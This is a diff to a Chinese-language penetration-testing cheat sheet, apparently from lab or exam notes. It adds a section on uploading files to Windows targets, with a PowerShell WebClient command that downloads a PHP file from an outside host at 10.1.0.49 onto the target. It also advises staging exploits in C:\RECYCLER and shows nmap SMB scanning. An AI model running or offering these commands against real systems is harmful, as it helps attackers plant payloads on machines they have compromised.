@@ -137,7 +137,6 @@ root@kali:~# nmap -v -p 139,445 --script smb-xxx x.x.x.x # 同时加载多个 NS
 
 ```BASH
 $ nmap -v -sV -sT --top-ports 10 --open x.x.x.x  # 快速扫描 top 10 端口
-
 ```
 
 
@@ -169,6 +168,16 @@ dir /q
 ### 文件上传的存放位置
 
 `C:\RECYCLER ` 通常是可读写的目录，上传的 *exp* 建议放在这儿。
+
+*Windows* 上传方式
+
+- *Windows* 没有内置的 *curl* 或 *wget* ，所以使用 *powershell* 来替代下载功能
+
+```powershell
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.1.0.49:8000/fuck.php','C:\fuck.php')
+```
+
+更多的上传方式请参考 [Windows-privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation/blob/master/README.md)。
 
 
 
@@ -203,6 +212,8 @@ net start upnphost
 C:\"Documents and Settings"\Administrator\Desktop\proof.txt
 
 ```
+
+
 
 
 
